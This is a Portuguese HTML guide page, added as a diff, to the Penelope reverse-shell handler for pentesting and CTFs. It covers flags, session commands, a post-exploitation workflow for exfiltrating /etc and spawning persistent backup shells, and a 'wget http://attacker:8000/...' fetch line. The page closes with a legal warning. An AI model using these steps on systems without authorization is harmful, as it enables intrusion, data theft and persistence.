@@ -1,0 +1,409 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Penelope — Guia Detalhado</title>
+<style>
+  :root {
+    --bg: #0f1115; --card: #171a21; --border: #262b36;
+    --text: #e6e8eb; --muted: #8b93a1; --accent: #00d1b2;
+    --accent2: #4f8cff; --code-bg: #0b0d11; --star: #f5c518;
+  }
+  [data-theme="light"] {
+    --bg: #f5f6f8; --card: #ffffff; --border: #e1e4e8;
+    --text: #1a1d23; --muted: #5f6672; --accent: #00897b;
+    --accent2: #2962ff; --code-bg: #f0f2f5;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+    background: var(--bg); color: var(--text);
+    line-height: 1.6; padding: 2rem 1rem;
+    transition: background .3s, color .3s;
+  }
+  .container { max-width: 960px; margin: 0 auto; }
+  .top-actions { display: flex; justify-content: flex-end; gap: .5rem; margin-bottom: 1rem; }
+  .icon-btn {
+    background: var(--card); border: 1px solid var(--border);
+    color: var(--text); width: 40px; height: 40px;
+    border-radius: 8px; cursor: pointer; font-size: 1.1rem;
+    display: flex; align-items: center; justify-content: center;
+    transition: border-color .2s, transform .1s;
+  }
+  .icon-btn:hover { border-color: var(--accent); transform: translateY(-1px); }
+  .back-link {
+    display: inline-flex; align-items: center; gap: .35rem;
+    color: var(--accent2); text-decoration: none;
+    font-size: .9rem; margin-bottom: 1.5rem;
+  }
+  .back-link:hover { text-decoration: underline; }
+  header { border-bottom: 1px solid var(--border); padding-bottom: 1.5rem; margin-bottom: 2rem; }
+  h1 {
+    font-size: 2.2rem;
+    background: linear-gradient(90deg, var(--accent), var(--accent2));
+    -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+    background-clip: text; margin-bottom: .5rem;
+  }
+  .subtitle { color: var(--muted); font-size: 1.05rem; }
+  .meta { margin-top: .75rem; display: flex; gap: 1rem; flex-wrap: wrap; font-size: .85rem; }
+  .meta span { color: var(--muted); }
+  .meta a { color: var(--accent2); text-decoration: none; }
+  .meta a:hover { text-decoration: underline; }
+  h2 {
+    font-size: 1.35rem; margin: 2.5rem 0 1rem;
+    padding-bottom: .4rem; border-bottom: 1px solid var(--border);
+    color: var(--accent);
+  }
+  h3 { font-size: 1.05rem; margin: 1.5rem 0 .5rem; color: var(--text); }
+  p { margin-bottom: 1rem; color: var(--muted); font-size: .95rem; }
+  ul, ol { margin: 0 0 1rem 1.5rem; color: var(--muted); font-size: .95rem; }
+  li { margin-bottom: .35rem; }
+  strong { color: var(--text); }
+  .card {
+    background: var(--card); border: 1px solid var(--border);
+    border-radius: 12px; padding: 1.25rem; margin-bottom: 1rem;
+  }
+  .code {
+    background: var(--code-bg); border: 1px solid var(--border);
+    border-radius: 6px; padding: .65rem .85rem;
+    font-family: "SF Mono", Consolas, Monaco, monospace;
+    font-size: .82rem; color: var(--accent);
+    overflow-x: auto; white-space: pre-wrap;
+    margin-bottom: .85rem; cursor: pointer; position: relative;
+  }
+  .code:hover::after {
+    content: "copiar"; position: absolute; right: .6rem; top: .5rem;
+    font-size: .65rem; color: var(--muted); background: var(--code-bg);
+    padding: 0 .3rem;
+  }
+  .code.copied::after { content: "✓ copiado"; color: var(--accent); }
+  .tag {
+    display: inline-block; font-size: .7rem; text-transform: uppercase;
+    letter-spacing: .05em; padding: .2rem .55rem;
+    border-radius: 999px; margin-bottom: .75rem;
+  }
+  .tag-basic { background: rgba(0,209,178,.15); color: var(--accent); }
+  .tag-listen { background: rgba(79,140,255,.15); color: var(--accent2); }
+  .tag-file { background: rgba(255,80,80,.15); color: #ff6b6b; }
+  .tag-trick { background: rgba(245,197,24,.15); color: var(--star); }
+  .table {
+    width: 100%; border-collapse: collapse; font-size: .88rem; margin-bottom: 1rem;
+  }
+  .table th, .table td {
+    text-align: left; padding: .5rem .75rem;
+    border-bottom: 1px solid var(--border);
+  }
+  .table th { color: var(--accent); font-weight: 600; }
+  .table td { color: var(--muted); }
+  .table code { color: var(--accent); background: var(--code-bg); padding: .1rem .3rem; border-radius: 3px; }
+  .cheat-grid {
+    display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+    gap: .75rem; margin-bottom: 1rem;
+  }
+  .cheat-item {
+    background: var(--code-bg); border: 1px solid var(--border);
+    border-radius: 8px; padding: .75rem; font-size: .82rem;
+  }
+  .cheat-item .cmd {
+    color: var(--accent); font-family: monospace; display: block; margin-bottom: .3rem;
+  }
+  .cheat-item .desc { color: var(--muted); font-size: .78rem; }
+  .warning {
+    background: rgba(255,80,80,.08); border-left: 3px solid #ff5050;
+    padding: .85rem 1rem; border-radius: 0 8px 8px 0;
+    margin-bottom: 1rem; font-size: .88rem; color: var(--muted);
+  }
+  .warning strong { color: #ff6b6b; }
+  .highlight {
+    background: rgba(0,209,178,.08); border-left: 3px solid var(--accent);
+    padding: .85rem 1rem; border-radius: 0 8px 8px 0;
+    margin-bottom: 1rem; font-size: .88rem; color: var(--muted);
+  }
+  .highlight strong { color: var(--accent); }
+  footer {
+    margin-top: 3rem; text-align: center; font-size: .8rem;
+    color: var(--muted); border-top: 1px solid var(--border); padding-top: 1.5rem;
+  }
+  @media print {
+    body { background: #fff; color: #000; padding: 0; }
+    .top-actions, .back-link, .code:hover::after { display: none !important; }
+    h1 { -webkit-text-fill-color: #000; color: #000; }
+    .code { background: #f5f5f5; color: #333; }
+  }
+</style>
+</head>
+<body>
+<div class="container">
+
+<div class="top-actions">
+  <button class="icon-btn" id="themeBtn" title="Alternar tema">🌙</button>
+  <button class="icon-btn" id="printBtn" title="Imprimir / PDF">🖨️</button>
+</div>
+
+<a class="back-link" href="kali-tools.html">← Voltar às 15 ferramentas</a>
+
+<header>
+  <h1>Penelope</h1>
+  <p class="subtitle">Shell handler moderno — substitui o Netcat com PTY automático, multi-sessões e transferência de ficheiros</p>
+  <div class="meta">
+    <span>🔗 <a href="https://github.com/brightio/penelope" target="_blank" rel="noopener">GitHub</a></span>
+    <span>📖 <a href="https://github.com/brightio/penelope#readme" target="_blank" rel="noopener">Documentação</a></span>
+    <span>📦 <a href="https://github.com/brightio/penelope/releases" target="_blank" rel="noopener">Releases</a></span>
+  </div>
+</header>
+
+<h2>O que é o Penelope?</h2>
+<p>
+  O Penelope é um <strong>shell handler moderno</strong>, desenhado para pentesters e jogadores de CTF como
+  alternativa ao Netcat básico. O seu objetivo é simplificar, acelerar e otimizar os workflows de pós-exploração
+  após obter execução remota de código (RCE) . É escrito inteiramente em Python e usa
+  apenas a biblioteca padrão — <strong>sem dependências externas</strong> .
+</p>
+<p>
+  Foi adicionado ao Kali Linux na versão <strong>2026.2</strong> e está disponível via
+  <code>sudo apt install penelope</code>. Ganhou destaque pela praticidade no pós-exploração: em segundos,
+  transforma uma shell reversa básica numa sessão PTY totalmente interativa, com logging, transferências
+  e gestão multi-sessão .
+</p>
+
+<h2>Funcionalidades Principais</h2>
+<p>O Penelope resolve os problemas mais frustrantes de trabalhar com shells reversas capturadas por Netcat :</p>
+
+<table class="table">
+  <thead>
+    <tr><th>Funcionalidade</th><th>Descrição</th></tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><strong>Auto-upgrade para PTY</strong></td>
+      <td>Converte shells básicas em PTY totalmente interativas, com redimensionamento em tempo real. <code>Ctrl+C</code>, <code>su</code>, <code>sudo</code>, vim e nano funcionam corretamente .</td>
+    </tr>
+    <tr>
+      <td><strong>Multi-sessões</strong></td>
+      <td>Controla vários alvos em simultâneo, cada um com o seu próprio contexto e logging .</td>
+    </tr>
+    <tr>
+      <td><strong>Session logging</strong></td>
+      <td>Registo automático de todas as interações com o alvo, com timestamps .</td>
+    </tr>
+    <tr>
+      <td><strong>Transferência de ficheiros</strong></td>
+      <td>Upload e download de ficheiros e pastas entre atacante e alvo, incluindo URLs .</td>
+    </tr>
+    <tr>
+      <td><strong>Módulos auxiliares</strong></td>
+      <td>Execução de scripts em memória, enumeração e priv-esc .</td>
+    </tr>
+    <tr>
+      <td><strong>Port forwarding</strong></td>
+      <td>Encaminhamento de portas locais através da sessão .</td>
+    </tr>
+    <tr>
+      <td><strong>HTTP file server</strong></td>
+      <td>Serve ficheiros via HTTP para o alvo fazer download .</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2>Flags Essenciais</h2>
+<p>A sintaxe do Penelope é minimalista. Estas são as flags mais usadas :</p>
+
+<table class="table">
+  <thead>
+    <tr><th>Flag</th><th>Descrição</th></tr>
+  </thead>
+  <tbody>
+    <tr><td><code>-p PORTS</code></td><td>Portas a escutar (padrão: 4444)</td></tr>
+    <tr><td><code>-i INTERFACE</code></td><td>Interface/IP local (padrão: 0.0.0.0)</td></tr>
+    <tr><td><code>-c HOST</code></td><td>Ligar a bind shell no host</td></tr>
+    <tr><td><code>-a</code></td><td>Mostrar payloads de reverse shell</td></tr>
+    <tr><td><code>-s FILE/DIR</code></td><td>Servir ficheiro ou pasta via HTTP</td></tr>
+    <tr><td><code>-L</code></td><td>Desativar ficheiros de log</td></tr>
+    <tr><td><code>-U</code></td><td>Desativar upgrade automático de shell</td></tr>
+    <tr><td><code>-m N</code></td><td>Manter N sessões ativas por alvo</td></tr>
+  </tbody>
+</table>
+
+<h2>Exemplos de Uso — do Listen à Pós-Exploração</h2>
+
+<h3>1. Instalação</h3>
+<span class="tag tag-basic">Setup</span>
+<div class="code" data-cmd="sudo apt install penelope">sudo apt install penelope</div>
+<p>Kali Linux 2026.2+. Também disponível via Git clone ou pip .</p>
+
+<h3>2. Listen básico na porta 4444</h3>
+<span class="tag tag-listen">Listen</span>
+<div class="code" data-cmd="penelope">penelope</div>
+<p>Escuta em <code>0.0.0.0:4444</code>. Qualquer reverse shell que chegue é capturada .</p>
+
+<h3>3. Listen em porta específica</h3>
+<span class="tag tag-listen">Listen</span>
+<div class="code" data-cmd="penelope -p 5555">penelope -p 5555</div>
+<p>Escuta na porta 5555. Múltiplas portas: <code>-p 4444,5555,6666</code> .</p>
+
+<h3>4. Mostrar payloads de reverse shell</h3>
+<span class="tag tag-listen">Listen</span>
+<div class="code" data-cmd="penelope -a">penelope -a</div>
+<p>Mostra payloads prontos (Bash, Netcat, Python, Perl, PHP, PowerShell) baseados nos listeners ativos. Os payloads são base64 encoded para sobreviver a mangling .</p>
+
+<h3>5. Listen em interface específica</h3>
+<span class="tag tag-listen">Listen</span>
+<div class="code" data-cmd="penelope -i eth0 -p 5555">penelope -i eth0 -p 5555</div>
+<p>Escuta apenas na interface <code>eth0</code>. Útil em máquinas com múltiplas interfaces .</p>
+
+<h3>6. Ligar a bind shell</h3>
+<span class="tag tag-listen">Listen</span>
+<div class="code" data-cmd="penelope -c 192.168.1.10 -p 3333">penelope -c 192.168.1.10 -p 3333</div>
+<p>Liga a um bind shell em <code>192.168.1.10:3333</code> .</p>
+
+<h3>7. Reverse shell via SSH</h3>
+<span class="tag tag-trick">Truque</span>
+<div class="code" data-cmd="penelope ssh user@target">penelope ssh user@target</div>
+<p>Obtém uma reverse shell do alvo na porta local 4444. Útil quando tens credenciais SSH mas queres uma shell gerida pelo Penelope .</p>
+
+<h3>8. Servir ficheiro via HTTP</h3>
+<span class="tag tag-file">Ficheiros</span>
+<div class="code" data-cmd="penelope -s file.txt">penelope -s file.txt</div>
+<p>Serve <code>file.txt</code> em <code>0.0.0.0:8000</code>. O alvo pode fazer <code>wget http://attacker:8000/file.txt</code> .</p>
+
+<h3>9. Servir pasta completa</h3>
+<span class="tag tag-file">Ficheiros</span>
+<div class="code" data-cmd="penelope -s /path/to/tools">penelope -s /path/to/tools</div>
+<p>Serve toda a pasta. Útil para partilhar scripts de enumeração, exploits e ferramentas .</p>
+
+<h3>10. Modo upload HTTP</h3>
+<span class="tag tag-file">Ficheiros</span>
+<div class="code" data-cmd="penelope -s -u -ud /tmp/loot">penelope -s -u -ud /tmp/loot</div>
+<p>Aceita PUT/POST e guarda ficheiros em <code>/tmp/loot</code>. Útil para receber dados exfiltrados sem precisar de shell .</p>
+
+<h2>Menu Principal — Comandos Essenciais</h2>
+<p>Depois de capturar uma shell, prime <strong>F12</strong> para voltar ao menu principal. O menu suporta TAB completion e comandos curtos (<code>i 1</code> em vez de <code>interact 1</code>) :</p>
+
+<table class="table">
+  <thead>
+    <tr><th>Comando</th><th>Função</th></tr>
+  </thead>
+  <tbody>
+    <tr><td><code>sessions</code></td><td>Lista todas as sessões ativas </td></tr>
+    <tr><td><code>interact 1</code></td><td>Interage com a sessão 1 </td></tr>
+    <tr><td><code>spawn 1234</code></td><td>Cria um novo listener e gera shell adicional do mesmo alvo </td></tr>
+    <tr><td><code>maintain 2</code></td><td>Mantém 2 shells ativas por alvo, respawning quando morrem </td></tr>
+    <tr><td><code>upgrade</code></td><td>Força upgrade da shell para PTY </td></tr>
+    <tr><td><code>upload file.txt</code></td><td>Envia ficheiro para o alvo </td></tr>
+    <tr><td><code>download /etc/passwd</code></td><td>Descarrega ficheiro do alvo </td></tr>
+    <tr><td><code>script linpeas.sh</code></td><td>Executa script em memória e guarda output localmente </td></tr>
+    <tr><td><code>portfwd 127.0.0.1:8080 -&gt; 127.0.0.1:8080</code></td><td>Encaminha porta local para serviço no alvo </td></tr>
+    <tr><td><code>history</code></td><td>Histórico de comandos do menu (audit trail) </td></tr>
+  </tbody>
+</table>
+
+<h2>Workflow Típico — Pós-Exploração em Segundos</h2>
+<p>Um fluxo de trabalho completo com Penelope :</p>
+
+<table class="table">
+  <thead>
+    <tr><th>Passo</th><th>Ação</th></tr>
+  </thead>
+  <tbody>
+    <tr><td><strong>1</strong></td><td><code>penelope -a</code> — inicia listener e mostra payloads </td></tr>
+    <tr><td><strong>2</strong></td><td>Executa payload no alvo (ex: Bash TCP ou Netcat) </td></tr>
+    <tr><td><strong>3</strong></td><td>Shell chega automaticamente como PTY totalmente interativa </td></tr>
+    <tr><td><strong>4</strong></td><td>Prime <code>F12</code> para ir ao menu principal </td></tr>
+    <tr><td><strong>5</strong></td><td><code>run recon</code> — upload de scripts de enumeração </td></tr>
+    <tr><td><strong>6</strong></td><td><code>interact 1</code> — executa scripts e analisa output </td></tr>
+    <tr><td><strong>7</strong></td><td><code>download /etc</code> — exfiltra dados relevantes </td></tr>
+    <tr><td><strong>8</strong></td><td><code>spawn</code> — cria shell de backup para persistência </td></tr>
+  </tbody>
+</table>
+
+<h2>Cheat Sheet rápido</h2>
+<div class="cheat-grid">
+  <div class="cheat-item">
+    <span class="cmd">penelope</span>
+    <span class="desc">Listen em 0.0.0.0:4444</span>
+  </div>
+  <div class="cheat-item">
+    <span class="cmd">penelope -a</span>
+    <span class="desc">Listen + mostrar payloads</span>
+  </div>
+  <div class="cheat-item">
+    <span class="cmd">penelope -p 5555</span>
+    <span class="desc">Porta específica</span>
+  </div>
+  <div class="cheat-item">
+    <span class="cmd">penelope -s file.txt</span>
+    <span class="desc">Servir ficheiro HTTP</span>
+  </div>
+  <div class="cheat-item">
+    <span class="cmd">interact 1</span>
+    <span class="desc">Voltar à sessão 1</span>
+  </div>
+  <div class="cheat-item">
+    <span class="cmd">upload file.txt</span>
+    <span class="desc">Enviar para alvo</span>
+  </div>
+  <div class="cheat-item">
+    <span class="cmd">download /etc/passwd</span>
+    <span class="desc">Trazer do alvo</span>
+  </div>
+  <div class="cheat-item">
+    <span class="cmd">maintain 2</span>
+    <span class="desc">Manter 2 shells vivas</span>
+  </div>
+</div>
+
+<div class="highlight">
+  <strong>💡 Dica:</strong> O Penelope resolve o problema clássico de shells reversas capturadas com Netcat:
+  falta de TTY, comandos que quebram (<code>su</code>, <code>sudo</code>, editores), e perda de sessão sem
+  aviso. Com <code>maintain</code>, se uma shell morrer, é automaticamente substituída. Com <code>script</code>,
+  podes executar LinPEAS ou linux-smart-enumeration em memória, sem tocar o disco do alvo, e ver o output em
+  tempo real num ficheiro local . Para CTFs, é praticamente obrigatório.
+</div>
+
+<div class="warning">
+  <strong>⚠️ Aviso legal:</strong> O Penelope serve para gerir shells obtidas durante exploração de RCE.
+  Usá-lo para manter acesso, exfiltrar dados ou escalar privilégios em sistemas que não possuis ou para os
+  quais não tens autorização explícita por escrito é <strong>ilegal</strong>. A funcionalidade
+  <code>maintain</code> e o respawning automático de shells podem ser interpretados como estabelecimento de
+  persistência — um agravante em contexto legal. Usa apenas em sistemas próprios, laboratórios isolados ou
+  engajamentos com scope escrito e regras de engagement claras.
+</div>
+
+<footer>
+  Guia Penelope — parte da série "Top 15 Ferramentas Kali Linux".
+</footer>
+
+</div>
+
+<script>
+// Tema
+const themeBtn = document.getElementById("themeBtn");
+const savedTheme = localStorage.getItem("penelope-theme") || "dark";
+document.documentElement.setAttribute("data-theme", savedTheme);
+themeBtn.textContent = savedTheme === "dark" ? "🌙" : "☀️";
+
+themeBtn.addEventListener("click", () => {
+  const current = document.documentElement.getAttribute("data-theme");
+  const next = current === "dark" ? "light" : "dark";
+  document.documentElement.setAttribute("data-theme", next);
+  localStorage.setItem("penelope-theme", next);
+  themeBtn.textContent = next === "dark" ? "🌙" : "☀️";
+});
+
+// Imprimir
+document.getElementById("printBtn").addEventListener("click", () => window.print());
+
+// Copiar comandos
+document.querySelectorAll(".code").forEach(el => {
+  el.addEventListener("click", () => {
+    navigator.clipboard.writeText(el.dataset.cmd).then(() => {
+      el.classList.add("copied");
+      setTimeout(() => el.classList.remove("copied"), 1200);
+    });
+  });
+});
+</script>
+
+</body>
+</html>
